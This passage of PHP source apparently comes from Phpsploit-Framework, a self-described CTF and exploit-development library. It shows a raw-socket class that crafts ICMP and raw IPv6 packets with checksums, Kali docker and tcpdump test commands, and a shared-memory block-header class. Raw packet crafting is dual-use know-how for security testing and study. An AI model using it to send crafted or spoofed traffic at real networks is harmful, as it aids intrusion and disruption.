    const EXCEPTION_BREAK                = 1;

    const TEST_DOCKER_RUN_CLI_LOCALHOST       = 'sudo docker run -p 40668:40668 -p 40022:22 -p 40080:80 -p 43306:3306 -e MYSQL_PASS="" --ip6 --fixed-cidr-v6  --security-opt seccomp=unconfined -it kali:v1.1 /bin/bash';
    const TEST_WIRESHARK_FILTER_LOCALHOST     = "((ipv6.addr==0:0:0:0:0:0:0:1) or (ipv6.addr==2001:db8:1::242:ac11:1/64) or (ipv6.addr==2001:db8:1::242:ac11:2/64) or(ipv6.addr==2001:db8:1::242:ac11:3/64) or (ipv6.addr==2001:db8:1::242:ac11:4/64) or (ipv6.addr==fe80::42:72ff:fea9:50c1/64)) and (ipv6) and (not icmpv6)";
    const TEST_TCPDUMP_FILTER_LOCALHOST_LO    = "tcpdump -i lo -vnn ip6";
    const TEST_TCPDUMP_FILTER_LOCALHOST_ETH0  = "tcpdump -i eth0 -vnn ip6";
    const TEST_TCPDUMP_FILTER_LOCALHOST_WLAN0 = "tcpdump -i wlan0 -vnn ip6";

    private static $_sockets = array ();

    public static function get_icmp_socket ( $key , $domain = self::DOMAIN_IPV4 , $protocol = self::PROTOCOL_ICMP )
    {
        if ( empty( self::$_sockets[ $key ] ) || ( ( ! is_resource ( self::$_sockets[ $key ] ) ) && ( ( ! is_object ( self::$_sockets[ $key ] ) ) || ( ! ( self::$_sockets[ $key ] instanceof \Socket ) ) ) ) ) {
            self::$_sockets[ $key ] = socket_create ( $domain , self::TYPE_RAW , $protocol );
            if ( self::$_sockets[ $key ] === false ) {
                $_error_code    = socket_last_error ();
                $_error_message = socket_strerror ( $_error_code );
                throw new \Exception( $_error_message , $_error_code );
            }
        }
        return self::$_sockets[ $key ];
    }

    public static function select_icmp_socket ( $key , $timeout = 6 )
    {
        $_socket = self::get_icmp_socket ( $key );
        $_read   = array ( $_socket );//初始化socket
        $_write  = array ( $_socket );
        $_except = array ( $_socket );
        $_select = socket_select ( $_read , $_write , $_except , $timeout );
        if ( $_select === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            self::clear_icmp_socket ( $key );
            throw new \Exception( $_error_message , $_error_code );
        } else if ( $_select === 0 ) {
            self::clear_icmp_socket ( $key );
            throw new \Exception( "sockets [ " . $key . " ] select request is time out" , $_select );
        }
        $_return = array ( "read" => $_read , "write" => $_write , "except" => $_except , "select" => $_select );
        return $_return;
    }

    public static function clear_icmp_socket ( $key )
    {
        $_socket = self::get_icmp_socket ( $key );
        @socket_close ( $_socket );
        self::$_sockets[ $key ] = null;
        unset( self::$_sockets[ $key ] );
    }

    private static function _create_icmp_data_package_header ()
    {
        $_mode                      = ( chr ( 8 ) . chr ( 0 ) );
        $_checksum                  = ( chr ( 0 ) . chr ( 0 ) );
        $_id                        = ( "RC" );
        $_seq                       = ( chr ( 0 ) . chr ( 1 ) );
        $_header                    = ( $_mode . $_checksum . $_id . $_seq );
        $_header_size               = strlen ( $_header );
        $_fill_in_placeholders_size = 64;
        $_fill_in_placeholders      = "";
        for ( $fill_in_placeholders_index = $_header_size ; $fill_in_placeholders_index < $_fill_in_placeholders_size ; $fill_in_placeholders_index ++ ) {
            $_fill_in_placeholders .= chr ( 0 );
        }
        $_package_header = "";
        $_package_header .= $_header;
        $_package_header .= $_fill_in_placeholders;
        return $_package_header;
    }

    public static function create_icmp_data_package ()
    {
        $_package_header      = self::_create_icmp_data_package_header ();
        $_checksum            = self::create_checksum ( $_package_header );
        $_package_header[ 2 ] = ( $_checksum[ 0 ] );
        $_package_header[ 3 ] = ( $_checksum[ 1 ] );
        $_package             = ( $_package_header );
        return $_package;
    }

    public static function send_icmp_data_package ( $key , $package , $host = "127.0.0.1" , $flags = 0 , $port = 0 )
    {
        $_socket       = self::get_icmp_socket ( $key );
        $_package_size = strlen ( $package );
        $_length       = socket_sendto ( $_socket , $package , $_package_size , $flags , $host , $port );
        if ( $_length === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            throw new \Exception( $_error_message , $_error_code );
        }
        return $_length;
    }

    public static function receive_icmp_data_package ( $key , &$data , $host = "127.0.0.1" , $receive_size = 65535 , $flags = 0 , $port = 0 , $unpack = 0 )
    {
        $_socket = self::get_icmp_socket ( $key );
        $_length = socket_recvfrom ( $_socket , $data , $receive_size , $flags , $host , $port );
        if ( $_length === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            throw new \Exception( $_error_message , $_error_code );
        }
        if ( ! empty( $unpack ) ) {
            $data = unpack ( "C*" , $data );
        }
        return $_length;
    }

    public static function format_receive_icmp_data_for_ping ( $receive_data )
    {
        $_format_receive_data = array (
            "receive_data_content_size" => 0 ,
            "ttl"                       => 0 ,
            "seq"                       => 0 ,
        );
        if ( ( ! empty( $receive_data ) ) && ( is_array ( $receive_data ) ) ) {
            $_format_receive_data[ "receive_data_content_size" ] = ( count ( $receive_data ) - 20 );
            $_format_receive_data[ "ttl" ]                       = intval ( $receive_data[ 9 ] );
            $_format_receive_data[ "seq" ]                       = intval ( $receive_data[ 28 ] );
        }
        return $_format_receive_data;
    }

    public static function create_checksum ( $package )
    {
        $_tmp      = unpack ( "n*" , $package );
        $_sum      = array_sum ( $_tmp );
        $_sum      = ( ( $_sum >> 16 ) + ( $_sum & 0xFFFF ) );
        $_sum      = ( $_sum + ( $_sum >> 16 ) );
        $_sum      = ( ~$_sum );
        $_checksum = pack ( "n*" , $_sum );
        return $_checksum;
    }

    public static function long4_to_ipv4 ( $long4 )
    {
        $_long = ( 4294967295 - ( $long4 - 1 ) );
        $_long = long2ip ( - $_long );
        return $_long;
    }

    public static function ipv4_to_long4 ( $ipv4 )
    {
        $_ipv4 = sprintf ( "%u" , ip2long ( $ipv4 ) );
        return $_ipv4;
    }

    public static function ping ( $host = "127.0.0.1" , $timeout = 6 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        self::get_icmp_socket ( $host );
        self::select_icmp_socket ( $host , $timeout );
        $_start_time          = microtime ();
        $_package             = self::create_icmp_data_package ();
        $_send_length         = self::send_icmp_data_package ( $host , $_package , $host , 0 , 0 );
        $_receive_length      = self::receive_icmp_data_package ( $host , $_receive_data , $host , 65535 , 0 , 0 , 1 );
        $_format_receive_data = self::format_receive_icmp_data_for_ping ( $_receive_data );
        self::clear_icmp_socket ( $host );
        $_end_time  = microtime ();
        $_exec_time = intval ( ( $_end_time - $_start_time ) * 1000 );
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "receive " . $_format_receive_data[ "receive_data_content_size" ] . " bytes data from " . $host . " , seq ( " . $_format_receive_data[ "seq" ] . " )  , ttl ( " . $_format_receive_data[ "ttl" ] . " ) , response time ( " . $_exec_time . " ) ms" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . ( "receive " . $_format_receive_data[ "receive_data_content_size" ] . " bytes data from " . $host . " , seq ( " . $_format_receive_data[ "seq" ] . " )  , ttl ( " . $_format_receive_data[ "ttl" ] . " ) , response time ( " . $_exec_time . " ) ms" ) . "\n" );
        }
    }

    public static function dec_to_bin_string ( $integer )
    {
        if ( ( ! is_integer ( $integer ) ) && ( ! is_string ( $integer ) ) ) {
            throw new \Exception( ( "integer is neither a number nor a string , integer : " . print_r ( $integer , true ) ) , 0 );
        }
        $_integer = $integer;
        $_tmp     = "";
        if ( is_integer ( $integer ) ) {
            while ( $_integer >= 1 ) {
                $_mod     = ( $_integer % 2 );
                $_tmp     .= $_mod;
                $_integer = $_integer / 2;
            }
        } else if ( is_string ( $integer ) ) {
            if ( ! Class_Base_Format::is_integer ( $integer ) ) {
                throw new \Exception( ( "integer is not a integer number , integer : " . print_r ( $integer , true ) ) , 0 );
            }
            while ( ( bccomp ( $_integer , 1 ) == 1 ) || ( bccomp ( $_integer , 1 ) == 0 ) ) {
                $_mod     = bcmod ( $_integer , 2 );
                $_tmp     .= $_mod;
                $_integer = bcdiv ( $_integer , 2 );
            }
        }
        $_tmp_length = strlen ( $_tmp );
        $_bin        = "";
        for ( $i = ( $_tmp_length - 1 ) ; $i >= 0 ; $i -- ) {
            $_bin .= substr ( $_tmp , $i , 1 );
        }
        $_bin_length = strlen ( $_bin );
        if ( $_bin_length < 8 ) {
            $_bin = str_pad ( $_bin , 8 , '0' , STR_PAD_LEFT );
        }
        if ( ( $_bin_length % 8 ) != 0 ) {
            for ( $i = 1 ; $i < 8 ; $i ++ ) {
                $_tmp = ( $_bin_length + $i );
                if ( ( $_tmp % 8 ) == 0 ) {
                    break;
                }
            }
            $_bin = str_pad ( $_bin , $_tmp , '0' , STR_PAD_LEFT );
        }
        return $_bin;
    }

    public static function bin_string_to_dec ( $string )
    {
        $_dec    = 0;
        $_strlen = strlen ( $string );
        $_j      = 0;
        for ( $i = ( $_strlen - 1 ) ; $i >= 0 ; $i -- ) {
            $_char     = substr ( $string , $i , 1 );
            $_char_dec = intval ( $_char );
            if ( $_strlen <= 64 ) {
                $_dec += ( $_char_dec * pow ( 2 , $_j ) );
            } else {
                if ( ! is_string ( $_dec ) ) {
                    $_dec = strval ( $_dec );
                }
                $_dec = bcadd ( $_dec , ( bcmul ( $_char_dec , bcpow ( 2 , $_j ) ) ) );
            }
            $_j ++;
        }
        return $_dec;
    }

    public static function bin_string_to_bin ( $string )
    {
        $_bin    = "";
        $_strlen = strlen ( $string );
        if ( ( $_strlen < 8 ) || ( ( $_strlen % 8 ) != 0 ) ) {
            throw new \Exception( ( "string is error , stirng : " . print_r ( $string , true ) ) , 0 );
        }
        for ( $i = 0 ; $i < $_strlen ; $i += 8 ) {
            $_str  = substr ( $string , $i , 8 );
            $_dec  = bindec ( $_str );
            $_char = chr ( $_dec );
            $_bin  .= $_char;
        }
        return $_bin;
    }

    public static function bin_to_bin_string ( $bin )
    {
        $_bin_string = "";
        $_bin_length = strlen ( $bin );
        for ( $i = 0 ; $i < $_bin_length ; $i += 1 ) {
            $_char     = substr ( $bin , $i , 1 );
            $_dec      = ord ( $_char );
            $_bin_char = decbin ( $_dec );
            if ( strlen ( $_bin_char ) < 8 ) {
                $_bin_char = str_pad ( $_bin_char , 8 , '0' , STR_PAD_LEFT );
            }
            $_bin_string .= $_bin_char;
        }
        return $_bin_string;
    }

    public static function format_ipv6_address_to_128_bit ( $ipv6 )
    {
        $_integer    = self::ipv6_to_long6 ( $ipv6 );
        $_bin_string = self::dec_to_bin_string ( $_integer );
        $_bin        = self::bin_string_to_bin ( $_bin_string );
        return $_bin;
    }

    public static function format_128_bit_to_ipv6_address ( $bin )
    {
        $_bin_string = self::bin_to_bin_string ( $bin );
        $_dec        = self::bin_string_to_dec ( $_bin_string );
        $_ipv6       = self::long6_to_ipv6 ( $_dec );
        return $_ipv6;
    }

    public static function create_ipv6_data_package ( $src_ip = "2001:db8:1::242:ac11:2" , $dst_ip = "2001:db8:1::242:ac11:2" , $data = null )
    {
        $_128_bit_src = self::format_ipv6_address_to_128_bit ( $src_ip );
        $_128_bit_dst = self::format_ipv6_address_to_128_bit ( $dst_ip );

        $_head_version_traffic_flow_label = chr ( 0b01100000 ) . chr ( 0b00000000 ) . chr ( 0b00000000 ) . chr ( 0b00000000 );
        $_head_payload_length             = self::VALUE_BIT_IPV6_HEAD_PAYLOAD_LENGTH;
        $_head_next_header                = chr ( self::VALUE_BIT_IPV6_HEAD_NEXT_HEADER );
        $_head_hop_limit                  = chr ( self::VALUE_BIT_IPV6_HEAD_HOP_LIMIT );
        $_head_source_address             = $_128_bit_src;
        $_head_destination__address       = $_128_bit_dst;

        if ( ! is_string ( $data ) ) {
            if ( is_integer ( $data ) ) {
                $data = strval ( $data );
            } else {
                $data = str_repeat ( chr ( 0 ) , self::SIZE_BYTE_IPV6_DATA );
            }
        }
        $_data_length = strlen ( $data );
        if ( $_data_length < self::SIZE_BYTE_IPV6_DATA ) {
            $data = str_pad ( $data , self::SIZE_BYTE_IPV6_DATA , chr ( 0 ) , STR_PAD_RIGHT );
        }
        if ( $_data_length > self::SIZE_BYTE_IPV6_DATA ) {
            $data = substr ( $data , 0 , self::SIZE_BYTE_IPV6_DATA );
        }
        $_package = "";
        $_package .= self::format_ipv6_data_write ( $_head_version_traffic_flow_label , "a*" );
        $_package .= self::format_ipv6_data_write ( $_head_payload_length , "n*" );
        $_package .= self::format_ipv6_data_write ( $_head_next_header );
        $_package .= self::format_ipv6_data_write ( $_head_hop_limit );
        $_package .= $_head_source_address;
        $_package .= $_head_destination__address;
        $_package .= self::format_ipv6_data_write ( $data );
        return $_package;
    }

    public static function get_ipv6_socket ( $key )
    {
        if ( empty( self::$_sockets[ $key ] ) || ( ( ! is_resource ( self::$_sockets[ $key ] ) ) && ( ( ! is_object ( self::$_sockets[ $key ] ) ) || ( ! ( self::$_sockets[ $key ] instanceof \Socket ) ) ) ) ) {
            self::$_sockets[ $key ] = socket_create ( self::DOMAIN_IPV6 , self::TYPE_RAW , self::PROTOCOL_IPV6 );
            if ( self::$_sockets[ $key ] === false ) {
                $_error_code    = socket_last_error ();
                $_error_message = socket_strerror ( $_error_code );
                throw new \Exception( $_error_message , $_error_code );
            }
        }
        return self::$_sockets[ $key ];
    }

    public static function select_ipv6_socket ( $key , $timeout = 5 )
    {
        $_socket = self::get_ipv6_socket ( $key );
        $_read   = array ( $_socket );
        $_write  = array ( $_socket );
        $_except = array ( $_socket );
        $_select = socket_select ( $_read , $_write , $_except , $timeout );
        if ( $_select === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            self::clear_ipv6_socket ( $key );
            throw new \Exception( $_error_message , $_error_code );
        } else if ( $_select === 0 ) {
            self::clear_ipv6_socket ( $key );
            throw new \Exception( "sockets [ " . $key . " ] select request is time out" , $_select );
        }
        $_return = array ( "read" => $_read , "write" => $_write , "except" => $_except , "select" => $_select );
        return $_return;
    }

    public static function clear_ipv6_socket ( $key )
    {
        $_socket = self::get_ipv6_socket ( $key );
        @socket_close ( $_socket );
        self::$_sockets[ $key ] = null;
        unset( self::$_sockets[ $key ] );
    }

    public static function send_ipv6_data_package ( $key , $package , $host = "2001:db8:1::242:ac11:2" , $flags = 0 , $port = 0 )
    {
        $_socket       = self::get_ipv6_socket ( $key );
        $_package_size = strlen ( $package );
        $_length       = socket_sendto ( $_socket , $package , $_package_size , $flags , $host , $port );
        if ( $_length === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            throw new \Exception( $_error_message , $_error_code );
        }
        return $_length;
    }

    public static function receive_ipv6_data_package ( $key , &$data , $host = "2001:db8:1::242:ac11:2" , $receive_size = self::SIZE_RECEIVE_BYTE_MAX , $flags = 0 , $port = 0 )
    {
        $_socket = self::get_ipv6_socket ( $key );
        $_length = socket_recvfrom ( $_socket , $data , $receive_size , $flags , $host , $port );
        if ( $_length === false ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            throw new \Exception( $_error_message , $_error_code );
        }
        $_head_version_traffic_flow_label = self::format_ipv6_data_read ( substr ( $data , 0 , 4 ) , "a*" );
        $_head_payload_length             = self::format_ipv6_data_read ( substr ( $data , 4 , 2 ) , "n*" );
        $_head_next_header                = self::format_ipv6_data_read ( substr ( $data , 6 , 1 ) );
        $_head_hop_limit                  = self::format_ipv6_data_read ( substr ( $data , 7 , 1 ) );
        $_head_source_address             = self::format_128_bit_to_ipv6_address ( substr ( $data , 8 , 16 ) );
        $_head_destination__address       = self::format_128_bit_to_ipv6_address ( substr ( $data , 24 , 16 ) );
        $_data                            = self::format_ipv6_data_read ( substr ( $data , 40 , 984 ) );
        $_package                         = array (
            "package_size"                    => $_length ,
            "package_length"                  => $_length ,
            "head_version_traffic_flow_label" => self::bin_to_bin_string ( $_head_version_traffic_flow_label ) ,
            "head_payload_length"             => $_head_payload_length ,
            "head_next_head"                  => self::bin_to_bin_string ( $_head_next_header ) ,
            "head_hop_limit"                  => self::bin_to_bin_string ( $_head_hop_limit ) ,
            "head_source_address"             => $_head_source_address ,
            "head_destination_address"        => $_head_destination__address ,
            "data"                            => Class_Base_Format::data_to_string ( $_data ) ,
            "data_length"                     => strlen ( $_data ) ,
        );
        return $_package;
    }

    public static function get_local_ipv6_address ()
    {
        $_local_ipv6 = null;
        $_ipv6s      = Class_Base_Shell::command ( "ip addr show | grep inet6" );
        if ( ! empty( $_ipv6s ) ) {
            foreach ( $_ipv6s as $index => $ipv6 ) {
                if ( ( strpos ( $ipv6 , "global" ) !== false ) ) {
                    $_local_ipv6 = substr ( ( substr ( ltrim ( $ipv6 ) , 0 , strpos ( ltrim ( $ipv6 ) , "/" ) ) ) , 6 );
                    break;
                }
            }
        }
        return $_local_ipv6;
    }

    public static function get_local_ipv4_address ()
    {
        $_local_ipv4 = null;
        $_ipv4s      = Class_Base_Shell::command ( "ip addr show | grep inet" );
        if ( ! empty( $_ipv4s ) ) {
            foreach ( $_ipv4s as $index => $ipv6 ) {
                if ( ( strpos ( $ipv6 , "inet6" ) === false ) && ( strpos ( $ipv6 , "global" ) !== false ) ) {
                    $_local_ipv4 = substr ( ( substr ( ltrim ( $ipv6 ) , 0 , strpos ( ltrim ( $ipv6 ) , "/" ) ) ) , 5 );
                    break;
                }
            }
        }
        return $_local_ipv4;
    }

    public static function get_remote_ipv6_address ( $key )
    {
        $_socket  = self::get_ipv6_socket ( $key );
        $_address = null;
        $_bool    = socket_getpeername ( $_socket , $_address );
        if ( empty( $_bool ) ) {
            $_error_code    = socket_last_error ();
            $_error_message = socket_strerror ( $_error_code );
            throw new \Exception( $_error_message , $_error_code );
        }
        return $_address;
    }

    public static function format_ipv6_data_write ( $data , $format = "a*" )
    {
        $_data = pack ( $format , $data );
        return $_data;
    }

    public static function format_ipv6_data_read ( $data , $format = "a*" )
    {
        $_data = unpack ( $format , $data );
        if ( is_array ( $_data ) ) {
            $_data = $_data[ 1 ];
        }
        return $_data;
    }

    public static function ipv6_to_long6 ( $ipv6 )
    {
        if ( ( strlen ( $ipv6 ) > 3 ) && ( substr ( $ipv6 , - 3 , 3 ) == "/64" ) ) {
            $ipv6 = substr ( $ipv6 , 0 , ( strlen ( $ipv6 ) - 3 ) );
        }
        $_ipv6_bin_string = "";
        $_ipv6_bin        = inet_pton ( $ipv6 );
        for ( $_ipv6_bin_index = 15 ; $_ipv6_bin_index >= 0 ; $_ipv6_bin_index -- ) {
            $_ascii           = ord ( $_ipv6_bin[ $_ipv6_bin_index ] );
            $_ascii_bin       = str_pad ( decbin ( $_ascii ) , 8 , '0' , STR_PAD_LEFT );
            $_ipv6_bin_string = ( $_ascii_bin . $_ipv6_bin_string );
        }
        $_long6 = self::bin_string_to_dec ( $_ipv6_bin_string );
        return $_long6;
    }

    public static function long6_to_complete_ipv6 ( $long6 )
    {
        $_ipv6_bin_string = Class_Base_RawSocket::dec_to_bin_string ( $long6 );
        if ( strlen ( $_ipv6_bin_string ) < 128 ) {
            $_ipv6_bin_string = str_pad ( $long6 , 128 , "0" , STR_PAD_LEFT );
        }
        $_ipv6 = "";
        for ( $_ipv6_bin_index = 0 ; $_ipv6_bin_index <= 7 ; $_ipv6_bin_index ++ ) {
            $_16_bit_bin = substr ( $_ipv6_bin_string , ( $_ipv6_bin_index * 16 ) , 16 );
            $_hex        = dechex ( bindec ( $_16_bit_bin ) );
            if ( $_ipv6_bin_index < 7 ) {
                $_ipv6 .= $_hex . ":";
            } else {
                $_ipv6 .= $_hex;
            }
        }
        return $_ipv6;
    }

    public static function long6_to_ipv6 ( $long6 )
    {
        $_ipv6 = self::long6_to_complete_ipv6 ( $long6 );
        $_ipv6 = inet_ntop ( inet_pton ( $_ipv6 ) );
        return $_ipv6;
    }

    public static function format_package_bin_to_hex ( $package )
    {
        if ( ! is_string ( $package ) ) {
            $package = strval ( $package );
        }
        $package = bin2hex ( $package );
        return $package;
    }

    public static function create_data_package ( $data , $type = self::PROTOCOL_IPV6 )
    {
        if ( $type == self::PROTOCOL_IPV6 ) {
            $_package = self::create_ipv6_data_package ( $data[ "src_ip" ] , $data[ "dst_ip" ] , $data );
            return $_package;
        }
        return null;
    }

    public static function format_package_checksum_write ( $checksum )
    {
        $_checksum = pack ( "n*" , $checksum );//打包成2字节
        return $_checksum;
    }

    public static function format_package_checksum_read ( $package )
    {
        $_data = unpack ( "n*" , $package );
        return $_data;
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-10
 * Time: 下午3:35
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_BlockHead extends Class_Base implements Interface_Base_BlockHead
{
    private $_block_name;
    private $_block_key;
    private $_content_size;
    private $_block_status;
    private $_block_mode;
    private $_block_type;
    private $_content_type;
    private $_reserved;
    private $_head_end_flag;

    public static function is_block_head ( $block )
    {
        if ( ( empty( $block ) ) || ( ! is_object ( $block ) ) || ( ! ( $block instanceof Class_Base_BlockHead ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_block_name ( $block )
    {
        if ( ! property_exists ( $block , "_block_name" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_name ) ) || ( ! is_string ( $block->_block_name ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_block_key ( $block )
    {
        if ( ! property_exists ( $block , "_block_key" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_key ) ) || ( ! is_integer ( $block->_block_key ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_size ( $block )
    {
        if ( ! property_exists ( $block , "_content_size" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_content_size ) ) || ( ! is_integer ( $block->_content_size ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_status ( $block )
    {
        if ( ! property_exists ( $block , "_block_status" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_status ) ) || ( ! is_integer ( $block->_block_status ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_mode ( $block )
    {
        if ( ! property_exists ( $block , "_block_mode" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_mode ) ) || ( ! is_integer ( $block->_block_mode ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_block_type ( $block )
    {
        if ( ! property_exists ( $block , "_block_type" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_block_type ) ) || ( ! is_integer ( $block->_block_type ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_content_type ( $block )
    {
        if ( ! property_exists ( $block , "_content_type" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_content_type ) ) || ( ! is_integer ( $block->_content_type ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_reserved ( $block )
    {
        if ( ! property_exists ( $block , "_reserved" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_reserved ) ) || ( ! is_string ( $block->_reserved ) ) ) {
            return false;
        }
        if ( strlen ( $block->_reserved ) != self::SIZE_BLOCK_HEAD_RESERVED ) {
            return false;
        }
        return true;
    }

    public static function check_block_head_end_flag ( $block )
    {
        if ( ! property_exists ( $block , "_head_end_flag" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_head_end_flag ) ) || ( ! is_string ( $block->_head_end_flag ) ) ) {
            return false;
        }
        return true;
    }

    public static function create_block_head ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag )
    {
        $_block_data = new Class_Base_BlockHead( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag );
        return $_block_data;
    }

    public static function get_head_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START );
        return $_offset;
    }

    public static function get_head_block_name_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START );
        return $_offset;
    }

    public static function get_head_block_key_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME );
        return $_offset;
    }

    public static function get_head_content_size_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY );
        return $_offset;
    }

    public static function get_head_block_status_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE );
        return $_offset;
    }

    public static function get_head_block_mode_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS );
        return $_offset;
    }

    public static function get_head_block_type_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE );
        return $_offset;
    }

    public static function get_head_content_type_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE );
        return $_offset;
    }

    public static function get_head_reserved_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE + self::SIZE_BLOCK_HEAD_CONTENT_TYPE );
        return $_offset;
    }

    public static function get_head_end_flag_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY + self::SIZE_BLOCK_HEAD_CONTENT_SIZE + self::SIZE_BLOCK_HEAD_BLOCK_STATUS + self::SIZE_BLOCK_HEAD_BLOCK_MODE + self::SIZE_BLOCK_HEAD_BLOCK_TYPE + self::SIZE_BLOCK_HEAD_CONTENT_TYPE + self::SIZE_BLOCK_HEAD_RESERVED );
        return $_offset;
    }

    public static function get_head_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD );
        return $_size;
    }

    public static function get_head_block_name_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_BLOCK_NAME );
        return $_size;
    }

    public static function get_head_block_key_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_BLOCK_KEY );
        return $_size;
    }

    public static function get_head_content_size_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_CONTENT_SIZE );
        return $_size;
    }

    public static function get_head_block_status_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_BLOCK_STATUS );
        return $_size;
    }

    public static function get_head_block_mode_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_BLOCK_MODE );
        return $_size;
    }

    public static function get_head_block_type_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_BLOCK_TYPE );
        return $_size;
    }

    public static function get_head_content_type_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_CONTENT_TYPE );
        return $_size;
    }

    public static function get_head_reserved_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_RESERVED );
        return $_size;
    }

    public static function get_head_end_flag_size ()
    {
        $_size = ( self::SIZE_BLOCK_HEAD_END_FLAG );
        return $_size;
    }

    public static function check_block_head_data ( $head )
    {
        if ( empty( $head ) ) {
            return false;
        }
        if ( ! is_string ( $head ) ) {
            return false;
        }
        if ( strlen ( $head ) != self::SIZE_BLOCK_HEAD ) {
            return false;
        }
        if ( Class_Base_Format::is_empty ( $head ) ) {
            return false;
        }
        if ( Class_Base_Format::is_empty ( substr ( $head , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME ) , self::SIZE_BLOCK_HEAD_BLOCK_KEY ) ) ) {
            return false;
        }
